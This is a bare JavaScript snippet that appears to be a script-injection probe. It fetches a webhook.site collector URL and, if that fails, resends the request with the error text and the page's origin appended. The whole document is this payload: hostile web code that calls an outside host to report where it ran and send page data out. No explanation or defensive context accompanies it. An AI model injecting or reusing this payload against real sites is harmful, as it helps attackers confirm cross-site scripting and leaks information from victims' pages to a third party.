try{
  var a = await fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?")
}catch(err){
  await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err+document.location.origin,{"mode":"cors"});
}
  
